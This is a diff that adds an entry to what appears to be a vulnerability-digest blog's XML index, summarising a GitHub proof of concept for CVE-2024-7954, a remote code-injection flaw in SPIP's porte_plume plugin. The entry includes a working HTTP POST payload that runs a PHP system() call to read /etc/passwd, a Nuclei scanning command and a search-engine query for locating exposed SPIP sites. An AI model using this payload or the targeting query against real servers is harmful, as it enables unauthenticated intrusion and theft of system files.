@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>SPIP porte_plume插件任意代码执行漏洞</title>
+    <link href="/2025/06/11/github_3980059939/"/>
+    <url>/2025/06/11/github_3980059939/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SPIP porte_plume插件任意代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-7954</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> SPIP的porte_plume插件在4.30-alpha2、4.2.13和4.1.16之前的版本中存在任意代码执行漏洞。远程且未经认证的攻击者可以通过发送特制的HTTP请求，以SPIP用户的身份执行任意PHP代码。</p><p><strong>产品厂商：</strong> SPIP</p><p><strong>产品名称：</strong> SPIP</p><p><strong>影响版本：</strong> version &lt; 4.30-alpha2, version &lt;&#x3D; 4.2.13, version &lt;&#x3D; 4.1.16</p><p><strong>搜索语法：</strong> app&#x3D;”SPIP”</p><p><strong>来源：</strong> <a href="https://github.com/DennZFV/RCE-CVE-2025">https://github.com/DennZFV/RCE-CVE-2025</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>RCE_CVE-2024-7954-main</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2><b>Codded By DennZF</b></h2><h2><b>Description :</b></h2><p>The porte_plume plugin used by SPIP before 4.30-alpha2, 4.2.13, and 4.1.16 is vulnerable to an arbitrary code execution vulnerability. A remote and unauthenticated attacker can execute arbitrary PHP as the SPIP user by sending a crafted HTTP request. (CRITICAL)</p><h2><b>Exploitasi :</b></h2><p>POST &#x2F;index.php?action&#x3D;porte_plume_previsu HTTP&#x2F;1.1</p><p>Host: <br>Content-Type: application&#x2F;x-www-form-urlencoded</p><p>data&#x3D;AA_[<img111111>-&gt;URL<code>&lt;?php system(&#39;cat /etc/passwd&#39;); ?&gt;</code>]_BB</p><h2><b>Use This Tools :</B></h2><p>Nuclei -l(target file) -t(Templates) CVE-2024-7954.yml</p><h2><b>Shodan Dorking :</b></h2>app="SPIP"<h2><b>Reference :</b></h2>https://github.com/DennZFV]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>代码注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Apache Struts 路径遍历与远程代码执行漏洞</title>
     <link href="/2025/06/11/github_4241703152/"/>
     <url>/2025/06/11/github_4241703152/</url>
